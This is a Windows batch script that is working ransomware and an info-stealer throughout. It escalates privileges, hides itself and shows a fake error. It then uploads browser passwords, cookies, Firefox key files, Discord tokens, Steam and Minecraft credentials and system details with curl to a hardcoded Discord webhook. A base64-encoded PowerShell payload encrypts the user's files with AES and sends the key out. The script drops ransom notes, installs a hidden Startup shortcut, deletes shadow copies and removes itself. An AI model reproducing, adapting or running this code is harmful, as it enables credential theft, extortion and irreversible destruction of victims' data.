@echo off
setlocal enabledelayedexpansion

:: Inputs
set "version=1.0.0"
set "TARGET_DIR=%USERPROFILE%"
set "EXTENTIONS=.lnk,.dll,.js,.jar,.py,.sh,.php,.html,.htm,.css,.txt,.docx,.xlsx,.pptx,.pdf,.zip,.rar,.7z,.tar,.gz,.iso,.img,.dmg,.msi,.apk,.ipa,.sys,.bin,.dat,.log,.msp,.msu,.cab,.inf,.reg,.xml,.json,.yaml,.yml,.csv,.tsv,.md,.rtf,.odt,.odp,.ods,.odg,.odf,.c,.cpp,.cs,.swift,.rb,.go,.ts,.lua,.pl,.r,.scala,.ini,.toml,.properties,.env,.sql,.db,.sqlite,.sqlite3,.pkl,.pickle,.h5,.hdf5,.parquet,.sav,.dta,.por,.mp3,.wav,.flac,.ogg,.m4a,.aac,.mp4,.mkv,.avi,.mov,.webm,.flv,.jpg,.jpeg,.png,.gif,.bmp,.tiff,.webp,.svg,.ico,.vmdk,.vdi,.vhd,.vhdx,.ova,.ovf,.dockerfile,.whl,.egg,.epub,.mobi,.tex,.as,.fla,.swf,.blend,.3ds,.obj,.fbx,.stl,.dwg,.dxf,.psd,.ai,.indd,.xcf,.sketch,.fig,.xd,.ttf,.otf,.woff,.woff2,.bak,.tmp,.part,.crdownload,.torrent,.cue,.nfo,.sfv,.sig,.pem,.crt,.cer,.key,.asc,.gpg,.ics,.vcf,.lst,.map,.log1,.log2,.dmp,.core,.ram,.m3u,.pls,.asx,.srt,.sub,.idx,.bup,.ifo,.vob,.rm,.ts,.hex,.elf"
set "WEBHOOK=https://discord.com/api/webhooks/1245309165371654205/HJndj2bB5UPs5z943clvBQUWU6Iw7aLB8lYuraalavaMtXqyFF-j_JK77m90XY5wXp2D"
set "TMP_B64=%TEMP%\_enc_payload.b64"
set "TMP_PS1=%TEMP%\_enc_payload.ps1"
set "ID=%random%%random%%random%%random%%random%%random%"

:: Elevate Priviledges
chcp 65001 > nul
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

:: Run process hidden
if exist "%~dp0\vbscript.vbs" goto next1
if not exist "%~dp0\vbscript.vbs" goto next2
exit
:next2
set "98374=%~nx0"
set "u=,"
set "a=0"
echo Set WshShell = CreateObject("WScript.Shell") > vbscript.vbs&echo WshShell.Run chr(34) ^& "!98374!" ^& Chr(34)!u! !a! >> vbscript.vbs&echo Set WshShell = Nothing >> vbscript.vbs
start vbscript.vbs
exit
:next1
del /q "%~dp0\vbscript.vbs"

:: Make itself invisible
Attrib +h +s "%0"

:: Fake message
msg *           Please check the file path and try again.

:: Steal informaton
for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
	set HH24=%%a
	set MI=%%b
)
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
::-----------------------------------------------------------------------------------------------------------------------------------------
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[ 1. Report from %USERNAME% - %NetworkIP% @ %TIME% ] \nBatch process started...```\"}" %WEBHOOK%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[ 2. Report from %USERNAME% - %NetworkIP% @ %TIME% ]\nID: %ID%```\"}" %wh%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[ Version info from %USERNAME% - %NetworkIP% @ %TIME% ] \n Version - %version%```\"}" %WEBHOOK%
set "uuulllpppphzugtrfdesdtfzguhu=%appdata%\sysinfo.txt"
2>NUL SystemInfo > "%uuulllpppphzugtrfdesdtfzguhu%"
curl --silent --output /dev/null -F systeminfo=@"%uuulllpppphzugtrfdesdtfzguhu%" %WEBHOOK%
del "%uuulllpppphzugtrfdesdtfzguhu%" >nul 2>&1
set "uuullnlpppphzugtrfdesdtfzguhu=%appdata%\tasklist.txt"
2>NUL tasklist > "%uuullnlpppphzugtrfdesdtfzguhu%"
curl --silent --output /dev/null -F tasks=@"%uuullnlpppphzugtrfdesdtfzguhu%" %WEBHOOK%
del "%uuullnlpppphzugtrfdesdtfzguhu%" >nul 2>&1
set "uuullnlpppphzugdtrfdesdtfzguhu=%appdata%\netuser.txt"
2>NUL net user > "%uuullnlpppphzugdtrfdesdtfzguhu%"
curl --silent --output /dev/null -F tasks=@"%uuullnlpppphzugdtrfdesdtfzguhu%" %WEBHOOK%
del "%uuullnlpppphzugdtrfdesdtfzguhu%" >nul 2>&1
set "uuullnldpppphzugdtrfdesdtfzguhu=%appdata%\quser.txt"
2>NUL quser > "%uuullnldpppphzugdtrfdesdtfzguhu%"
curl --silent --output /dev/null -F tasks=@"%uuullnldpppphzugdtrfdesdtfzguhu%" %WEBHOOK%
del "%uuullnldpppphzugdtrfdesdtfzguhu%" >nul 2>&1
set "uuullnlddpppphzugdtrfdesdtfzguhu=%appdata%\stup.txt"
2>NUL reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run >> "%uuullnlddpppphzugdtrfdesdtfzguhu%"
curl --silent --output /dev/null -F tasks=@"%uuullnlddpppphzugdtrfdesdtfzguhu%" %WEBHOOK%
del "%uuullnlddpppphzugdtrfdesdtfzguhu%" >nul 2>&1
set "uuullnldddpppphzugdtrfdesdtfzguhu=%appdata%\cmdkey.txt"
2>NUL cmdkey /list > "%uuullnldddpppphzugdtrfdesdtfzguhu%"
curl --silent --output /dev/null -F tasks=@"%uuullnldddpppphzugdtrfdesdtfzguhu%" %WEBHOOK%
del "%uuullnldddpppphzugdtrfdesdtfzguhu%" >nul 2>&1
set "uuullnldddpsppphzugdtrfdesdtfzguhu=%appdata%\ipconfig.txt"
2>NUL ipconfig /all > "%uuullnldddpsppphzugdtrfdesdtfzguhu%"
curl --silent --output /dev/null -F tasks=@"%uuullnldddpsppphzugdtrfdesdtfzguhu%" %WEBHOOK%
del "%uuullnldddpsppphzugdtrfdesdtfzguhu%" >nul 2>&1
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MICROSOFT EDGE // from %USERNAME% - %NetworkIP% @ %TIME%```\"}"  %WEBHOOK%
curl --silent --output /dev/null -F hstry=@"%userprofile%\AppData\Local\Microsoft\Edge\User Data\Default\History" %WEBHOOK%	
set "directory=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network"
set "file_extension=*."
cd /d "%directory%"
for %%f in (*%file_extension%) do (
    curl --silent --output /dev/null -F tasks=@"%%f" %WEBHOOK%
)
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME // from %USERNAME% - %NetworkIP% @ %TIME%```\"}"  %WEBHOOK%
set "directory2=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network"
set "file_extension2=*."
cd /d "%directory2%"
for %%f in (*%file_extension2%) do (
    curl --silent --output /dev/null -F tasks=@"%%f" %WEBHOOK%
)
curl --silent --output /dev/null -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %WEBHOOK%
timeout /t 1 /nobreak > NUL
curl --silent --output /dev/null -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %WEBHOOK%
curl --silent --output /dev/null -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %WEBHOOK%
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %WEBHOOK%
timeout /t 1 /nobreak > NUL
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %WEBHOOK%	
timeout /t 1 /nobreak > NUL
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- OPERA // from %USERNAME% - %NetworkIP% @ %TIME%```\"}"  %WEBHOOK%
curl --silent --output /dev/null -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %WEBHOOK%
curl --silent --output /dev/null -F h=@"%appdata%\Opera Software\Opera Stable\History" %WEBHOOK%
timeout /t 1 /nobreak > NUL
curl --silent --output /dev/null -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %WEBHOOK%
curl --silent --output /dev/null -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %WEBHOOK%
curl --silent --output /dev/null -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %WEBHOOK%	
timeout /t 1 /nobreak > NUL
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- VIVALDI // from %USERNAME% - %NetworkIP% @ %TIME%```\"}"  %WEBHOOK%
curl --silent --output /dev/null -F c=@"%localappdata%\Vivaldi\User Data\Default\Cookies" %WEBHOOK%
curl --silent --output /dev/null -F h=@"%localappdata%\Vivaldi\User Data\Default\History" %WEBHOOK%
timeout /t 1 /nobreak > NUL
curl --silent --output /dev/null -F s=@"%localappdata%\Vivaldi\User Data\Default\Shortcuts" %WEBHOOK%
curl --silent --output /dev/null -F b=@"%localappdata%\Vivaldi\User Data\Default\Bookmarks" %WEBHOOK%
curl --silent --output /dev/null -F l=@"%localappdata%\Vivaldi\User Data\Default\Login Data" %WEBHOOK%	
timeout /t 1 /nobreak > NUL
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- FIREFOX // from %USERNAME% - %NetworkIP% @ %TIME%```\"}"  %WEBHOOK%
for /f %%f in ('2^>NUL dir /b "%appdata%\Mozilla\Firefox\Profiles"') do (
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json" %WEBHOOK%
	timeout /t 1 /nobreak > NUL
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db" %WEBHOOK%
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db" %WEBHOOK%
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite" %WEBHOOK%
	
	timeout /t 1 /nobreak > NUL
	)
)
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- osu! // from %USERNAME% - %NetworkIP% @ %TIME%```\"}"  %WEBHOOK%
curl --silent --output /dev/null -F c=@"%localappdata%\osu!\osu!.%username%.cfg" %WEBHOOK%
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD // from %USERNAME% - %NetworkIP% @ %TIME%```\"}"  %WEBHOOK%
for /f %%f in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
	echo %%f|find ".ldb"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F level=@"%appdata%\discord\Local Storage\leveldb\%%f" %WEBHOOK%
		
		timeout /t 1 /nobreak > NUL
	)
)
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM // from %USERNAME% - %NetworkIP% @ %TIME%```\"}"  %WEBHOOK%
	curl --silent --output /dev/null -F steamusers=@"C:\Program Files (x86)\Steam\config\loginusers.vdf" %WEBHOOK%
	curl --silent --output /dev/null -F loginusers=@"C:\Program Files\Steam\config\loginusers.vdf" %WEBHOOK%
for /f %%s in ('2^>NUL dir /b "C:\Program Files (x86)\Steam\"') do (
	echo %%s|find "ssfn"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F auth=@"C:\Program Files (x86)\Steam\%%s" %WEBHOOK%
		
		timeout /t 1 /nobreak > NUL
	)
)
for /f %%s in ('2^>NUL dir /b "C:\Program Files\Steam\"') do (
	echo %%s|find "ssfn"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F auth=@"C:\Program Files\Steam\%%s" %WEBHOOK%
		
		timeout /t 1 /nobreak > NUL
	)
)
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT // from %USERNAME% - %NetworkIP% @ %TIME%```\"}"  %WEBHOOK%
curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_profiles.json" %WEBHOOK%
curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_accounts.json" %WEBHOOK%	
timeout /t 1 /nobreak > NUL
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- GROWTOPIA // from %USERNAME% - %NetworkIP% @ %TIME%```\"}"  %WEBHOOK%
curl --silent --output /dev/null -F save.dat=@"%localappdata%\Growtopia\save.dat" %WEBHOOK%	

:: Write base64 content
> "%TMP_B64%" (
echo cGFyYW0gKA0KICAgIFtzdHJpbmddJHJvb3RQYXRoLA0KICAgIFtzdHJpbmddJGV4dGVuc2lvbnNSYXcsDQogICAgW3N0cmluZ10kd2ViaG9vaw0KKQ0KDQokZXh0ZW5zaW9ucyA9ICRleHRlbnNpb25zUmF3IC1zcGxpdCAiLCIgfCBGb3JFYWNoLU9iamVjdCB7ICRfLlRyaW0oKSB9DQoNCmZ1bmN0aW9uIEdlbmVyYXRlLVJhbmRvbUJ5dGVzKCRsZW5ndGgpIHsNCiAgICAkcm5nID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmFuZG9tTnVtYmVyR2VuZXJhdG9yXTo6Q3JlYXRlKCkNCiAgICAkYnl0ZXMgPSBOZXctT2JqZWN0IGJ5dGVbXSAkbGVuZ3RoDQogICAgJHJuZy5HZXRCeXRlcygkYnl0ZXMpDQogICAgcmV0dXJuICRieXRlcw0KfQ0KDQoka2V5ID0gR2VuZXJhdGUtUmFuZG9tQnl0ZXMgMzIgICMgQUVTLTI1Ng0KJGl2ICA9IEdlbmVyYXRlLVJhbmRvbUJ5dGVzIDE2ICAjIEFFUyBibG9jayBzaXplDQoNCiRrZXlCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRrZXkpDQokaXZCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRpdikNCg0KIyBTZW5kIEFFUyBrZXkgJiBJViB0byB3ZWJob29rDQokcGF5bG9hZCA9IEB7IGNvbnRlbnQgPSAiQUVTIEtleTogJGtleUI2NGBuSVY6ICRpdkI2NCIgfSB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcw0KDQp0cnkgew0KICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIgLUJvZHkgJHBheWxvYWQNCiAgICBXcml0ZS1Ib3N0ICJbK10gV2ViaG9vayBzZW50LiINCn0NCmNhdGNoIHsNCiAgICBXcml0ZS1Ib3N0ICJbIV0gV2ViaG9vayBmYWlsZWQ6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIg0KfQ0KDQpmdW5jdGlvbiBQYWQtQnl0ZXMoJGJ5dGVzKSB7DQogICAgJHBhZExlbiA9IDE2IC0gKCRieXRlcy5MZW5ndGggJSAxNikNCiAgICAkcGFkQnl0ZXMgPSBOZXctT2JqZWN0IGJ5dGVbXSAkcGFkTGVuDQogICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkcGFkTGVuOyAkaSsrKSB7DQogICAgICAgICRwYWRCeXRlc1skaV0gPSBbYnl0ZV0kcGFkTGVuDQogICAgfQ0KICAgIHJldHVybiAkYnl0ZXMgKyAkcGFkQnl0ZXMNCn0NCg0KZnVuY3Rpb24gRW5jcnlwdC1GaWxlKCRmaWxlUGF0aCkgew0KICAgIHRyeSB7DQogICAgICAgICRkYXRhID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRmaWxlUGF0aCkNCiAgICAgICAgJHBhZGRlZCA9IFBhZC1CeXRlcyAkZGF0YQ0KDQogICAgICAgICRhZXMgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNdOjpDcmVhdGUoKQ0KICAgICAgICAkYWVzLktleSA9ICRrZXkNCiAgICAgICAgJGFlcy5JViA9ICRpdg0KICAgICAgICAkYWVzLk1vZGUgPSAnQ0JDJw0KICAgICAgICAkYWVzLlBhZGRpbmcgPSAnTm9uZScNCg0KICAgICAgICAkZW5jID0gJGFlcy5DcmVhdGVFbmNyeXB0b3IoKQ0KICAgICAgICAkY2lwaGVyID0gJGVuYy5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRwYWRkZWQsIDAsICRwYWRkZWQuTGVuZ3RoKQ0KDQogICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJGZpbGVQYXRoLCAkY2lwaGVyKQ0KICAgICAgICBXcml0ZS1Ib3N0ICJbK10gRW5jcnlwdGVkOiAkZmlsZVBhdGgiDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgV3JpdGUtV2FybmluZyAiWyFdIEZhaWxlZCB0byBlbmNyeXB0OiAkZmlsZVBhdGggLSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSINCiAgICB9DQp9DQojIEVuc3VyZSBleHRlbnNpb25zIGFyZSBjbGVhbg0KJGV4dGVuc2lvbnMgPSAkZXh0ZW5zaW9uc1JhdyAtc3BsaXQgIiwiIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5UcmltKCkuVG9Mb3dlcigpIH0NCiMgUmVjdXJzaXZlbHkgZ2V0IGFuZCBlbmNyeXB0IGZpbGVzIHdpdGggbWF0Y2hpbmcgZXh0ZW5zaW9ucw0KR2V0LUNoaWxkSXRlbSAtUGF0aCAkcm9vdFBhdGggLVJlY3Vyc2UgLUZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3Qgew0KICAgICRleHRlbnNpb25zIC1jb250YWlucyAkXy5FeHRlbnNpb24uVG9Mb3dlcigpDQp9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgIHRyeSB7DQogICAgICAgIEVuY3J5cHQtRmlsZSAkXy5GdWxsTmFtZQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgIFdyaXRlLVdhcm5pbmcgIkZhaWxlZCB0byBlbmNyeXB0OiAkKCRfLkZ1bGxOYW1lKSAtICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIg0KICAgIH0NCn0NCg0K==
)

:: Decode script
certutil -decode "%TMP_B64%" "%TMP_PS1%" >nul

:: Run PowerShell with webhook passed in as last argument
powershell -ExecutionPolicy Bypass -File "%TMP%\_enc_payload.ps1" "%TARGET_DIR%" "%EXTENTIONS%" "%WEBHOOK%"

:: Cleanup
del /s /f /q %userprofile%\Recent\*.*
del /s /f /q C:\Windows\Prefetch\*.*
del /s /f /q C:\Windows\Temp\*.*
del /s /f /q %USERPROFILE%\appdata\local\temp\*.*
del "%TMP_B64%" >nul
del "%TMP_PS1%" >nul

:: Ransom note
set "FILENAME=YOUR_ID.txt"
set "TARGETS=%USERPROFILE%\Desktop %USERPROFILE%\Documents %USERPROFILE%\Downloads %USERPROFILE%\Music %USERPROFILE%\Pictures %USERPROFILE%\Videos"
for %%F in (%TARGETS%) do (
    if exist "%%F" (
        echo This is your personal ID: %ID% > "%%F\%FILENAME%"
        echo Contact ... in order to regain access to your files >> "%%F\%FILENAME%"
    ) else (
        echo Folder "%%F" does not exist, skipping...
    )
)

:: Overwrite deleted files process creator
set ggdgzwzwgzdgzwgdzwggdzeuwezgdbxpgwdzugw=%random%%random%%random%%random%
echo QGVjaG8gb2ZmCmNoY3AgNjUwMDEgPiBudWwKaWYgZXhpc3QgIiV+ZHAwXHZic2NyaXB0LnZicyIgZ290byBuZXh0MQppZiBub3QgZXhpc3QgIiV+ZHAwXHZic2NyaXB0LnZicyIgZ290byBuZXh0MgpleGl0CjpuZXh0MgpzZXQgIjk4Mzc0PSV+bngwIgpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uCiViZXViZnp1YndlenVnYnpyZ2V1d29yYnNmZGpraGd1ZXJvJXMlYmZoaHJ3ZWZiZWh3Z2l1JWUlYmhyYnp1ZmJpZXp3aXpld3JpdWZienViZXdmenV3ZWliZnp1aWV3JXQlYmNlYmZ6dWJ3ZXpmdWJ6d2VpdXpmdXdpYmV6cmdvdyUgJWJ1ZWlxYmZ6d2l1Ynp1M2llYnpyd2l1JSIlYmhldWJmenVpZXdienVmYmV6d3VpJXUlYmRoZWp3YmtmaGt3ZWJmdWVrenJrJT0sIiVuamtyZW5mdWlyd2VpZ25ldWlyd25nd2VvaW5ndWlvd25lcmdpbnJldSUlZWJmdWJlemd1enJiZmhza2RiZ3VlcnolCiVidXJlZ2Zieml3ZWJ6ZnVpZXdiemd1aWJmemVydXJlJXMlemVpd2d6ZXJ3emZid3plcmlmYnp1d2VpZ3p1aSVlJWJjZWZzYnpid2l6enVpJXQlZWdpZnd6dWllenV3ZWlienJ1Zmlid2V6aXUlICVoZXdqcWJkaHdlYmZod2prZWJoZWJ3dWslIiViemV6ZnV6cmJ6d2V6aXUlYSVkYmVod3FiZmR6ZXdiZnpiaWV3emklPTAiJWJoZWRqd2ZiemJ6dWJ3ZXp1aSUlYmN6ZXdiZnp1aWV3Ynp1Z3dlenVpciUlYnpjdWJlemZ1YmV6ZnVpYmV3emZyaSUlYmNlenJmYnVld2J6dWJld3p1aWZienV3ZWZ6d3VlJQplY2hvIFNldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpID4gdmJzY3JpcHQudmJzJmVjaG8gV3NoU2hlbGwuUnVuIGNocigzNCkgXiYgIiE5ODM3NCEiIF4mIENocigzNCkhdSEgIWEhID4+IHZic2NyaXB0LnZicyZlY2hvIFNldCBXc2hTaGVsbCA9IE5vdGhpbmcgPj4gdmJzY3JpcHQudmJzCnN0YXJ0IHZic2NyaXB0LnZicwpleGl0CjpuZXh0MQplbmRsb2NhbApkZWwgL3EgIiV+ZHAwXHZic2NyaXB0LnZicyIKY2lwaGVyIC93OkMgJiYgYXR0cmliIC1oIC1zICUwICYmIGRlbCAvcSAvZiAlMA== > "%TEMP%\cmd.txt"
timeout 2 /nobreak > nul
certutil -decode cmd.txt "%TEMP%\%ggdgzwzwgzdgzwgdzwggdzeuwezgdbxpgwdzugw%.cmd"
timeout 2 /nobreak > nul
del /q /f "%TEMP%\cmd.txt"
set ggdgzwduzwgzdgzwgdzwgzudgzwegdzugwdzugw=%random%%random%%random%%random%
echo Set oWS = WScript.CreateObject("WScript.Shell") > %TEMP%\CS2.vbs
echo sLinkFile = "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%ggdgzwduzwgzdgzwgdzwgzudgzwegdzugwdzugw%.lnk" >> "%TEMP%\CS2.vbs"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%TEMP%\CS2.vbs"
echo oLink.TargetPath = "%TEMP%\%ggdgzwzwgzdgzwgdzwggdzeuwezgdbxpgwdzugw%.cmd" >> "%TEMP%\CS2.vbs"
echo oLink.WorkingDirectory = "%TEMP%" >> "%TEMP%\CS2.vbs"
echo oLink.Description = "%ggdgzwzwgzdgzwgdzwggdzeuwezgdbxpgwdzugw%" >> "%TEMP%\CS2.vbs"
echo oLink.Save >> "%TEMP%\CS2.vbs"
cscript "%TEMP%\CS2.vbs"
attrib +h +s "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%ggdgzwduzwgzdgzwgdzwgzudgzwegdzugwdzugw%.lnk"
del /q "%TEMP%\CS2.vbs"

:: Delete shadow copys / deleted files
vssadmin delete shadows /all /quiet
start "%TEMP%\%ggdgzwzwgzdgzwgdzwggdzeuwezgdbxpgwdzugw%.cmd"

:: Delete itself
Attrib -h -s -r %0
del /q /f %0